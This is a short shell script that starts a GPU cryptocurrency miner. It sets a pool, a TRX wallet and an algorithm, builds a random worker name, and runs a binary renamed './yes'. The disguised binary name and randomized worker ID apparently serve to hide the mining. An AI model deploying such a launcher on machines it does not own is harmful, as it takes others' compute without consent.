POOL=rx-us.unmineable.com:3333
WALLET=TRX:TE8QDGV3weSuyMDmTYUv3V4DK6d872mwwA
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo zXVmPG4H-$(shuf -i 1911-819873 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
